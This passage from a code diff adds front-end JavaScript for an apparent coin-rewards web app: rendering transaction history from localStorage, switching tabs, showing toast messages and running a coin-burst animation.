+  let hist = LS.get('ff_history') || [];
+  hist.unshift({
+    id: Date.now(),
+    type, description, amount,
+    timestamp: Date.now()
+  });
+  if(hist.length > MAX_HISTORY) hist = hist.slice(0, MAX_HISTORY);
+  LS.set('ff_history', hist);
+  if(document.getElementById('tab-history').classList.contains('active')) renderHistory();
+}
+
+function renderHistory() {
+  const hist = LS.get('ff_history') || [];
+  const container = document.getElementById('history-container');
+  if(!container) return;
+  if(hist.length === 0) {
+    container.innerHTML = `<div class="history-empty"><div class="history-empty-icon">📋</div><div>No transactions yet</div><div style="font-size:12px;margin-top:6px">Earn your first reward to see history</div></div>`;
+    return;
+  }
+  container.innerHTML = `<div class="history-list">${hist.map(h=>`
+    <div class="history-item">
+      <div class="h-icon ${h.type==='earn'?'earn':'cashout'}">${h.type==='earn'?'🪙':'🎁'}</div>
+      <div class="h-info">
+        <div class="h-desc">${h.description}</div>
+        <div class="h-time">${fmtTime(h.timestamp)}</div>
+      </div>
+      <div class="h-amount ${h.amount>0?'pos':'neg'}">${h.amount>0?'+':''}${h.amount.toLocaleString()}</div>
+    </div>`).join('')}
+  </div>`;
+}
+
+// ─── NAVIGATION ───
+function switchTab(tab) {
+  document.querySelectorAll('.tab-section').forEach(s=>s.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  const section = document.getElementById(`tab-${tab}`);
+  if(section) section.classList.add('active');
+  const navItem = document.querySelector(`.nav-item[data-tab="${tab}"]`);
+  if(navItem) navItem.classList.add('active');
+  if(tab==='history') renderHistory();
+  if(tab==='cashout') updateCashoutView();
+  if(tab==='home') updateDashboard();
+  if(tab==='profile') { updateProfileView(); renderTotalEarned(); }
+}
+
+// ─── TOAST ───
+let toastTimer;
+function showToast(msg, type='info') {
+  const el = document.getElementById('toast');
+  el.textContent = msg;
+  el.className = `${type} show`;
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => { el.classList.remove('show'); }, 3000);
+}
+
+// ─── COIN BURST ───
+function spawnCoins() {
+  for(let i=0;i<8;i++) {
+    const el = document.createElement('div');
+    el.className = 'coin-particle';
+    const angle = Math.random()*360;
+    const dist = 60+Math.random()*80;
+    el.style.cssText = `
+      left: ${40+Math.random()*60}vw;
+      top: 40vh;
+      --tx: ${Math.cos(angle*Math.PI/180)*dist}px;
+      --ty: ${Math.sin(angle*Math.PI/180)*dist - 40}px;
+      animation-delay: ${Math.random()*0.3}s;
+    `;
+    el.textContent = '🪙';
+    document.body.appendChild(el);
+    setTimeout(()=>el.remove(), 1300);
+  }
+}
+
+// ─── ACTIVATE HOME ON START ───
+document.addEventListener('DOMContentLoaded', () => {
+  switchTab('home');
+});
+</script>
+</body>
+</html>
